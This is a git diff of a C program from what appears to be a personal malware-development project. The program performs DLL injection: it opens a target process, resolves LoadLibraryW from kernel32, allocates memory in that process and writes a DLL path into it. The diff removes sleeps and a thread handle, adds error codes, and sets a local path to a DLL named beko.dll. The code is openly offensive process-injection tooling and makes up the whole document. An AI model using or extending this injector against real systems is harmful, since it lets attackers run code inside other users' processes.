@@ -9,11 +9,11 @@
 extern void _DllMainCRTStartup(HANDLE targetHandle, LPVOID rBuffer, LPTHREAD_START_ROUTINE loadLibraryAddress);
 
     /***      VARIABLES    ***/
-    HANDLE hProcess, hThread;
+    HANDLE hProcess;
     DWORD PID; 
     LPVOID rBuffer; 
     HMODULE hKernel32; 
-    wchar_t dllPath[MAX_PATH] = L"C:\\path\\to\\dll";
+    wchar_t dllPath[MAX_PATH] = L"C:\\Users\\eberk\\OneDrive\\Desktop\\malware-development-project\\maldev\\Process Injection\\DLL Injection\\dll\\beko.dll";
     size_t dllSize = sizeof(dllPath);
 
 int main(int argc, char* argv[]) {
@@ -32,7 +32,6 @@ int main(int argc, char* argv[]) {
     okay("Opened Target Process!");
 
     info("Getting handle to kernel32.dll....");
-    Sleep(1500);
 
     hKernel32 = GetModuleHandleW(L"kernel32");
     if (hKernel32 == NULL) {
@@ -42,7 +41,6 @@ int main(int argc, char* argv[]) {
     okay("Got a handle to kernel32.dll! Address of kernel32.dll: 0x%p", hKernel32);
 
     info("Getting address of LoadLibraryW...");
-    Sleep(1500);
     LPTHREAD_START_ROUTINE wLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
     if (wLoadLibrary == NULL) {
         warn("Failed to get a address for LoadLibraryW! Error Code: 0x%lx", GetLastError());
@@ -58,7 +56,7 @@ int main(int argc, char* argv[]) {
     okay("Allocated Memory (Mem-Size: %zu-byte) for DLL Path! Address: 0x%p", dllSize, rBuffer);
 
     if(!(WriteProcessMemory(hProcess, rBuffer, dllPath, dllSize, 0))) {
-        warn("Failed to write dllPath to Allocated Memory");
+        warn("Failed to write dllPath to Allocated Memory Error Code: 0x%lx", GetLastError());
         goto CLEAN;
     }
     okay("Wrote dllPath to Allocated Memory!");
@@ -70,10 +68,6 @@ int main(int argc, char* argv[]) {
 
 
 CLEAN:
-    if (hThread) {
-        info("Closing handle to thread!");
-        CloseHandle(hThread);
-    }
     if (hProcess) {
         info("Closing handle to process!");
         CloseHandle(hProcess);
